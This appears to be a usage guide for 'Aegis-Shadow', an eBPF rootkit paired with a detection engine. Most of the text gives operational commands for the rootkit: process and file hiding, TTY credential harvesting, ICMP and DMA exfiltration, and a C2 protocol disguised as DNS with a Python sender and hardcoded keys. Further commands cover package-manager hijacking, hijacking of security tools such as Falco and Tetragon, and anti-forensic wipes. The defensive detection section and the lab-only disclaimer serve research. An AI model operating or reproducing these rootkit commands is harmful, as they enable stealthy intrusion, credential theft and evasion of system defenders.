# Aegis-Shadow Usage Guide

## Prerequisites

### System Requirements
- Linux kernel 5.10 or later with BTF support
- x86_64 architecture
- Root/sudo privileges
- At least 2GB RAM

### Software Dependencies
```bash
# Install Rust toolchain
curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh

# Install nightly toolchain
rustup install nightly
rustup component add rust-src --toolchain nightly

# Install bpf-linker
cargo install bpf-linker

# Install system dependencies (Ubuntu/Debian)
sudo apt-get install -y \
    clang \
    llvm \
    libelf-dev \
    linux-headers-$(uname -r) \
    build-essential \
    pkg-config

# Verify BTF support
ls /sys/kernel/btf/vmlinux
```

## Building the Project

### Quick Build
```bash
# Build everything (eBPF + user-space)
cargo xtask build-ebpf --release
cargo build --release

# Or use the Makefile
make build
```

### Development Build
```bash
# Debug build with verbose output
cargo xtask build-ebpf
cargo build
```

### Verify Environment
```bash
# Check all dependencies
./verify-env.sh
```

## Offensive Rootkit Usage

### Basic Usage

```bash
# Start the rootkit with default settings (loads core 13 features)
sudo ./target/release/offense --iface eth0

# Enable all extended features
sudo ./target/release/offense --iface eth0 \
    --enable-netns-hide \
    --enable-bpf-cloak \
    --enable-module-mask \
    --enable-memfd \
    --enable-syslog-strip \
    --enable-icmp-exfil \
    --enable-socket-clone \
    --enable-cred-relay \
    --enable-container-probe \
    --enable-hypervisor-evasion \
    --enable-polymorphic \
    --enable-phantom-stack \
    --enable-container-lateral \
    --enable-dma-covert \
    --enable-behavioral-ai \
    --enable-supply-chain \
    --enable-deadman-switch \
    --enable-bpf-parasitism
```

### CLI Flags

| Flag | Description |
|---|---|
| `--iface <name>` | Network interface for XDP/TC attachment (required) |
| `--verbose` | Enable debug-level logging |
| `--hide-pid <pid>` | Add a PID to the hidden process list on startup |
| `--obfuscate-inode <inode>` | Add an inode to the file obfuscation list |
| `--monitor-tty <major:minor>` | Monitor a TTY device for credential harvesting |
| `--spoof-ppid <pid:fake_ppid>` | Spoof a process's parent PID |
| `--timestomp <inode:atime:mtime:ctime>` | Set fake timestamps (epoch seconds) |
| `--pin-maps` | Pin BPF maps to `/sys/fs/bpf/shadow` for persistence |
| `--enable-netns-hide` | Enable network namespace hiding (intercepts setns) |
| `--enable-bpf-cloak` | Enable eBPF program cloaking (hides own prog IDs) |
| `--enable-module-mask` | Enable kernel module masquerading in /proc/modules |
| `--enable-memfd` | Enable memory-only payload staging (memfd_create + execveat) |
| `--enable-syslog-strip` | Enable syslog write stripping for hidden PIDs |
| `--wipe-bytecode` | Activate anti-forensics bytecode wipe (programs become no-ops) |
| `--enable-icmp-exfil` | Enable ICMP covert channel exfiltration |
| `--enable-socket-clone` | Enable socket cloning / connection shadowing |
| `--enable-cred-relay` | Enable credential relay over C2 channel |
| `--enable-container-probe` | Enable container escape probes |
| `--enable-hypervisor-evasion` | Enable hypervisor detection/evasion (CPUID, hypercall, TSC) |
| `--enable-polymorphic` | Enable polymorphic engine (bytecode morphing, pattern rotation) |
| `--enable-phantom-stack` | Enable phantom network stack (invisible TCP connections) |
| `--enable-container-lateral` | Enable cross-container lateral movement (cgroup/namespace abuse) |
| `--enable-dma-covert` | Enable DMA covert channels (IOMMU, PCIe TLP, NIC exfil) |
| `--enable-behavioral-ai` | Enable behavioral AI camouflage (syscall profiling, throttling) |
| `--enable-supply-chain` | Enable supply chain persistence (package manager hooking) |
| `--enable-deadman-switch` | Enable dead man's switch (heartbeat + scorched earth) |
| `--enable-bpf-parasitism` | Enable BPF parasitism (prog scanning, tail-call injection) |

### Feature-Specific Examples

#### 1. Process Hiding
```bash
# Hide a specific process
sudo ./target/release/offense --iface eth0 --hide-pid 1234

# Hide current shell
sudo ./target/release/offense --iface eth0 --hide-pid $$
```

#### 2. File Obfuscation
```bash
# Get file inode
INODE=$(stat -c %i /path/to/secret.txt)

# Obfuscate the file
sudo ./target/release/offense --iface eth0 --obfuscate-inode $INODE
```

#### 3. Credential Harvesting
```bash
# Monitor TTY device (e.g., pts/0 = 136:0)
sudo ./target/release/offense --iface eth0 --monitor-tty 136:0
```

#### 4. Process Ancestry Spoofing
```bash
# Spoof PID 1234's parent to appear as PID 1 (init)
sudo ./target/release/offense --iface eth0 --spoof-ppid 1234:1
```

#### 5. Timestomping
```bash
# Fake timestamps (format: inode:atime:mtime:ctime in epoch seconds)
INODE=$(stat -c %i /path/to/file.txt)
sudo ./target/release/offense --iface eth0 \
    --timestomp $INODE:1609459200:1609459200:1609459200
```

#### 6. Map Persistence
```bash
# Pin BPF maps to filesystem for persistence across loader restarts
sudo ./target/release/offense --iface eth0 --pin-maps

# Maps will be available at /sys/fs/bpf/shadow
```

#### 7. ICMP Covert Channel
```bash
# Enable ICMP-based data exfiltration
sudo ./target/release/offense --iface eth0 --enable-icmp-exfil

# Data is embedded in ICMP echo-request payloads (56 bytes per packet)
# Combined with credential relay for automated exfil:
sudo ./target/release/offense --iface eth0 \
    --enable-icmp-exfil \
    --enable-cred-relay \
    --monitor-tty 136:0
```

#### 8. Network Namespace Hiding
```bash
# Hide network namespaces from tools like ip netns
sudo ./target/release/offense --iface eth0 --enable-netns-hide
```

#### 9. eBPF Program Cloaking
```bash
# Hide rootkit's own BPF program IDs from bpftool
sudo ./target/release/offense --iface eth0 --enable-bpf-cloak
```

#### 10. Anti-Forensics Bytecode Wipe
```bash
# After initial operation, wipe program logic for anti-forensics
# Programs remain attached but become no-ops (evades bytecode dump analysis)
sudo ./target/release/offense --iface eth0 --wipe-bytecode
```

#### 11. Container Escape Probes
```bash
# Detect container context and monitor privilege escalation attempts
sudo ./target/release/offense --iface eth0 --enable-container-probe
```

#### 12. Memory-Only Execution
```bash
# Enable fileless execution path (memfd_create + execveat AT_EMPTY_PATH)
sudo ./target/release/offense --iface eth0 --enable-memfd
```

#### 13. Hypervisor Evasion
```bash
# Detect hypervisor type and exploit blind spots
sudo ./target/release/offense --iface eth0 --enable-hypervisor-evasion

# Combined with polymorphic to evade VM-based analysis sandboxes
sudo ./target/release/offense --iface eth0 \
    --enable-hypervisor-evasion \
    --enable-polymorphic
```

#### 14. Polymorphic Engine
```bash
# Enable self-modifying bytecode with pattern rotation
sudo ./target/release/offense --iface eth0 --enable-polymorphic

# Rotates instruction patterns via tail-call variant selection
# Inserts opaque predicates to defeat static analysis tools
```

#### 15. Phantom Network Stack
```bash
# Create invisible TCP connections below kernel stack
sudo ./target/release/offense --iface eth0 --enable-phantom-stack

# Phantom connections are invisible to ss, netstat, and conntrack
# Full stateful TCP handling (SYN/ACK, data transfer, FIN)
```

#### 16. Cross-Container Lateral Movement
```bash
# Enable cross-container movement via cgroup/namespace abuse
sudo ./target/release/offense --iface eth0 --enable-container-lateral

# Injects eBPF programs into target container cgroups
# Traverses namespaces and detects credential changes for escape
```

#### 17. DMA Covert Channels
```bash
# Enable hardware-level covert channels
sudo ./target/release/offense --iface eth0 --enable-dma-covert

# Uses IOMMU page tables, PCIe TLP patterns, and NIC padding
# for data exfiltration below OS visibility
```

#### 18. Behavioral AI Camouflage
```bash
# Enable statistical camouflage to evade anomaly detectors
sudo ./target/release/offense --iface eth0 --enable-behavioral-ai

# Profiles system behavior baseline, throttles rootkit activity
# to stay within normal statistical norms
```

#### 19. Supply Chain Persistence
```bash
# Hook package managers and patch binaries during install
sudo ./target/release/offense --iface eth0 --enable-supply-chain

# Monitors apt/yum/pip/npm/cargo executions
# Patches binaries in-flight and bypasses integrity checks
```

#### 20. Dead Man's Switch
```bash
# Arm the dead man's switch with heartbeat monitoring
sudo ./target/release/offense --iface eth0 --enable-deadman-switch

# If heartbeat UDP packets stop arriving, triggers scorched earth
# wipe of all evidence (maps, logs, artifacts)
```

#### 21. BPF Parasitism
```bash
# Detect and parasitize other eBPF security tools
sudo ./target/release/offense --iface eth0 --enable-bpf-parasitism

# Scans for Falco/Tetragon/Cilium/Datadog programs
# Injects into their tail-call arrays and hijacks prog arrays
```

#### 22. Advanced Kernel Object Manipulation
```bash
# task_struct patching, LSM subversion, IDT hooking, ftrace hiding, live-patching
sudo ./target/release/offense --iface eth0 --enable-kernel-object

# Patches task_struct fields, overrides LSM decisions, shadows IDT entries,
# hides from bpftool enumeration, abuses kernel live-patching infrastructure
```

#### 23. Network Stealth Layer
```bash
# Raw socket C2, TC injection, DoH domain fronting, traffic shaping
sudo ./target/release/offense --iface eth0 --enable-network-stealth

# XDP-based port coexistence C2, TC egress packet injection without sockets,
# DNS-over-HTTPS C2 with CDN domain fronting, kernel-level traffic shaping
```

#### 24. Advanced Persistence Mechanisms
```bash
# Obfuscated BPF pinning, cgroup persistence, module param injection, initramfs
sudo ./target/release/offense --iface eth0 --enable-persistence2

# Randomized BPF pin paths, cgroup attachment surviving process death,
# hidden params in /sys/module, boot-time BPF loader via initramfs
```

#### Full Advanced Deployment
```bash
# Enable all advanced modules for maximum evasion
sudo ./target/release/offense --iface eth0 \
    --hide-pid $$ \
    --enable-bpf-cloak \
    --enable-hypervisor-evasion \
    --enable-polymorphic \
    --enable-phantom-stack \
    --enable-container-lateral \
    --enable-dma-covert \
    --enable-behavioral-ai \
    --enable-supply-chain \
    --enable-deadman-switch \
    --enable-bpf-parasitism \
    --enable-kernel-object \
    --enable-network-stealth \
    --enable-persistence2
```

### Network C2 Commands

The rootkit listens for UDP packets on port 53 (disguised as DNS) with the following format:

```
[4 bytes: MAGIC 0xDEADBEEF] [12 bytes: nonce] [16 bytes: encrypted payload] [16 bytes: HMAC]
```

**Encryption**: ChaCha20 with a 256-bit key and 96-bit nonce.
**Authentication**: Truncated HMAC-SHA256 (16 bytes) verified before command execution.

**Command Types:**
| cmd_type | Action | arg1 | arg2 |
|---|---|---|---|
| 1 | Hide PID | PID to hide | unused |
| 2 | Unhide PID | PID to unhide | unused |
| 3 | Obfuscate file | inode number | unused |
| 4 | Exfiltrate data | context-dependent | unused |
| 5 | Kill switch | unused | unused |

**Example C2 Packet (Python):**
```python
import socket
import struct

MAGIC = b'\xDE\xAD\xBE\xEF'
KEY = b'AEGIS-SHADOW-CHACHA20-KEY-000001'  # 32 bytes
HMAC_KEY = b'AEGIS-SHADOWKEY1'  # 16 bytes

# Command: Hide PID 1234
cmd_type = 1
arg1 = 1234
arg2 = 0

payload = struct.pack('<III', cmd_type, arg1, arg2)
# Add ChaCha20 encryption and HMAC-SHA256 here...

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
sock.sendto(MAGIC + nonce + encrypted + mac, ('target_ip', 53))
```

### Stopping the Rootkit

```bash
# Press Ctrl+C in the terminal running the offense loader
# The kill switch C2 command (cmd_type=5) also triggers graceful shutdown
# Or kill the process:
sudo pkill -9 offense
```

## Defensive Detection Usage

### Basic Usage

```bash
# Run all detection modules
sudo ./target/release/defense --all-modules

# Run with verbose logging
sudo ./target/release/defense --all-modules --verbose

# Save alerts to JSON file
sudo ./target/release/defense --all-modules --output /tmp/alerts.json
```

### CLI Flags

| Flag | Description |
|---|---|
| `--verbose` / `-v` | Enable debug-level logging |
| `--output` / `-o` | Path to write JSON alert records |
| `--threshold` / `-t` | Alert severity threshold: 1=Low, 2=Medium (default), 3=High, 4=Critical |
| `--all-modules` | Enable all detection modules |
| `--ghost-maps` | Enable ghost map detection |
| `--syscall-latency` | Enable syscall latency monitoring |
| `--bytecode-check` | Enable bytecode integrity checking |
| `--hidden-process` | Enable hidden process detection |
| `--suspicious-hooks` | Enable suspicious hook detection |
| `--prog-inventory` | Enable eBPF program inventory (ID gap detection) |
| `--syscall-anomaly` | Enable syscall argument anomaly profiling |
| `--net-baseline` | Enable network behavior baseline |
| `--memfd-detect` | Enable memory-backed execution detection |
| `--map-audit` | Enable BPF map content auditing |
| `--tracepoint-monitor` | Enable tracepoint coverage monitoring (rapid detach detection) |
| `--auto-detach` | Automatic detachment of malicious BPF programs |
| `--auto-contain` | Automatic process containment via cgroups |
| `--honeypots` | Enable honeypot BPF maps |
| `--cross-reference` | Enable cross-reference detection (proc vs BPF PID discrepancy) |
| `--hw-perf-counters` | Enable hardware performance counter anomaly monitoring |
| `--verifier-analysis` | Enable eBPF verifier log analysis for suspicious patterns |
| `--memory-forensics` | Enable kernel data structure integrity monitoring |
| `--enable-ml` | Enable adversarial ML detection layer (syscall n-gram models) |
| `--calibration-period` | Baseline calibration duration in seconds (default: 60) |
| `--config` | Path to runtime config JSON file (hot-reloaded every 5s) |

### Module-Specific Detection

```bash
# Original 5 core modules
sudo ./target/release/defense \
    --ghost-maps \
    --syscall-latency \
    --bytecode-check \
    --hidden-process \
    --suspicious-hooks

# Extended detection modules
sudo ./target/release/defense \
    --prog-inventory \
    --syscall-anomaly \
    --net-baseline \
    --memfd-detect \
    --map-audit \
    --tracepoint-monitor

# Anti-detection research modules (12-15)
sudo ./target/release/defense \
    --cross-reference \
    --hw-perf-counters \
    --verifier-analysis \
    --memory-forensics \
    --enable-ml

# Active response modules
sudo ./target/release/defense \
    --all-modules \
    --auto-detach \
    --auto-contain \
    --honeypots

# Set alert threshold (1=Low, 2=Medium, 3=High, 4=Critical)
sudo ./target/release/defense --all-modules --threshold 3

# Custom calibration period
sudo ./target/release/defense --all-modules --calibration-period 120
```

### Honeypot Maps

The honeypot module creates decoy BPF maps with enticing names and pins them to `/sys/fs/bpf/honeypot/`. Any process that accesses these maps triggers a CRITICAL alert.

```bash
# Enable honeypot maps
sudo ./target/release/defense --honeypots --verbose

# Decoy maps created:
#   /sys/fs/bpf/honeypot/shadow_config
#   /sys/fs/bpf/honeypot/rootkit_pids
#   /sys/fs/bpf/honeypot/c2_keys
```

### Auto-Detach

When enabled, the defense engine automatically detaches BPF programs that accumulate 3+ corroborating alerts (from prog_inventory, suspicious_hooks, or map_audit modules).

```bash
sudo ./target/release/defense --all-modules --auto-detach
```

### Auto-Contain

When an attack chain is detected (3+ distinct alert types for a single PID within the sliding window), the engine moves the offending process into a restrictive cgroup.

```bash
sudo ./target/release/defense --all-modules --auto-contain
```

### Runtime Configuration (Hot-Reload)

The defense engine can reload its configuration without restarting. Create a JSON config file:

```json
{
  "threshold": 2,
  "window_secs": 30
}
```

Start the engine with `--config`:

```bash
sudo ./target/release/defense --all-modules --config /etc/aegis/config.json
```

The engine polls the file every 5 seconds. To change detection sensitivity at runtime:

```bash
# Increase sensitivity (lower threshold, wider window)
echo '{"threshold": 1, "window_secs": 60}' > /etc/aegis/config.json

# Decrease sensitivity (only critical alerts, narrow window)
echo '{"threshold": 4, "window_secs": 10}' > /etc/aegis/config.json
```

### DefenseEngine Intelligence

The engine provides more than raw alert forwarding:

- **Calibration**: During the initial calibration period, the engine collects baseline alert rates per type. After calibration completes, anomaly scoring activates.
- **Anomaly Scoring**: Each alert's rate (per PID, within the sliding window) is compared to the calibrated baseline. A score >= 10.0 escalates severity to CRITICAL.
- **Attack Chain Detection**: When a single PID triggers 3 or more distinct alert types within the sliding window, the engine flags the alerts as a correlated attack chain.
- **Correlation Graph**: A DAG structure tracks alert relationships (same-PID, parent-child, temporal proximity). Connected components with 3+ nodes are identified as coordinated attacks.
- **Metrics**: On shutdown (Ctrl+C), the engine prints a summary: alerts processed, alerts suppressed (below threshold), attack chains detected, anomaly escalations, and a per-type breakdown.

### Analyzing Alerts

```bash
# View real-time alerts
sudo ./target/release/defense --all-modules --verbose

# Parse JSON output
jq '.alert_type' /tmp/alerts.json | sort | uniq -c

# Filter by severity
jq 'select(.severity == "HIGH")' /tmp/alerts.json

# Find attack chains
jq 'select(.is_attack_chain == true)' /tmp/alerts.json

# Get alert timeline
jq -r '[.timestamp, .alert_type, .pid] | @tsv' /tmp/alerts.json

# Show anomaly scores above threshold
jq 'select(.anomaly_score > 5.0)' /tmp/alerts.json

# Filter honeypot alerts
jq 'select(.alert_type == "HONEYPOT_READ")' /tmp/alerts.json
```

## Testing

### Automated Tests

```bash
# Run integration tests (user-space, no root required)
cargo test -p integration-tests

# Run offense test suite (requires root, in VM)
sudo ./tests/test_offense.sh

# Run defense test suite (requires root, in VM)
sudo ./tests/test_defense.sh

# Run all tests via Makefile
make test
```

### Manual Testing

#### Test Process Hiding
```bash
# Terminal 1: Start rootkit
sudo ./target/release/offense --iface eth0 --hide-pid $$

# Terminal 2: Verify hiding
ps aux | grep $$  # Should not appear
ls /proc/$$       # Should still exist
```

#### Test File Obfuscation
```bash
# Create test file
echo "secret data" > /tmp/test.txt
INODE=$(stat -c %i /tmp/test.txt)

# Start rootkit with obfuscation
sudo ./target/release/offense --iface eth0 --obfuscate-inode $INODE

# Try to read file
cat /tmp/test.txt  # Should show zeros
```

#### Test Defense Detection
```bash
# Terminal 1: Start defense with all modules
sudo ./target/release/defense --all-modules --verbose --honeypots

# Terminal 2: Start offense (should trigger alerts)
sudo ./target/release/offense --iface eth0 \
    --hide-pid 1234 \
    --enable-bpf-cloak \
    --enable-memfd

# Check Terminal 1 for alerts (ghost_map, prog_inventory, memfd_exec)
```

#### Test Honeypot Detection
```bash
# Terminal 1: Start defense with honeypots
sudo ./target/release/defense --honeypots --verbose

# Terminal 2: Attempt to read honeypot map
sudo bpftool map dump pinned /sys/fs/bpf/honeypot/shadow_config

# Terminal 1 should show CRITICAL HONEYPOT_READ alert
```

#### Test Auto-Contain
```bash
# Start defense with auto-containment
sudo ./target/release/defense --all-modules --auto-contain --verbose

# In another terminal, trigger attack chain (3+ alert types from one PID)
# The defense engine will move the PID to a restrictive cgroup
```

## Troubleshooting

### Common Issues

#### 1. BTF Not Available
```bash
# Check BTF support
ls /sys/kernel/btf/vmlinux

# If missing, rebuild kernel with CONFIG_DEBUG_INFO_BTF=y
```

#### 2. Permission Denied
```bash
# Ensure running as root
sudo -i

# Check RLIMIT_MEMLOCK
ulimit -l  # Should be unlimited
```

#### 3. XDP Attachment Failed
```bash
# Check interface exists
ip link show eth0

# Detach existing XDP programs
sudo ip link set dev eth0 xdp off
```

#### 4. Map Pinning Failed
```bash
# Ensure bpffs is mounted
mount | grep bpf

# Mount if needed
sudo mount -t bpf bpf /sys/fs/bpf
```

#### 5. Honeypot Pin Directory
```bash
# Create honeypot pin directory if needed
sudo mkdir -p /sys/fs/bpf/honeypot
```

### Debug Mode

```bash
# Enable eBPF verifier logs
echo 1 | sudo tee /proc/sys/kernel/bpf_stats_enabled

# View BPF program info
sudo bpftool prog list
sudo bpftool map list

# Dump program instructions
sudo bpftool prog dump xlated id <ID>

# Check kernel logs
sudo dmesg | grep -i bpf
```

## Performance Tuning

### Reduce Overhead
```bash
# Disable verbose logging
./target/release/offense --iface eth0  # No --verbose flag

# Use higher threshold to reduce alert volume
./target/release/defense --all-modules --threshold 3

# Shorter calibration for faster startup
./target/release/defense --all-modules --calibration-period 30
```

### Optimize for Production
```bash
# Build with maximum optimizations
RUSTFLAGS="-C target-cpu=native" cargo build --release

# Use LTO (Link-Time Optimization)
# Already enabled in Cargo.toml
```

## Security Warnings

**CRITICAL WARNINGS:**

1. **Legal Use Only**: This tool is for authorized security research and testing only
2. **Controlled Environment**: Only use in isolated lab environments
3. **No Production Use**: Never deploy on production systems
4. **Ethical Responsibility**: Misuse may violate laws and regulations
5. **Data Protection**: Handle captured credentials responsibly

## Cleanup

```bash
# Stop all programs
sudo pkill -9 offense
sudo pkill -9 defense

# Remove pinned maps
sudo rm -rf /sys/fs/bpf/shadow
sudo rm -rf /sys/fs/bpf/honeypot

# Detach XDP/TC programs
sudo ip link set dev eth0 xdp off
sudo tc filter del dev eth0 egress

# Clean build artifacts
make clean
```

## Support

For issues, questions, or contributions:
- GitHub Issues: [Project Repository]
- Documentation: See README.md and ARCHITECTURE.md
- Security Research: Follow responsible disclosure practices
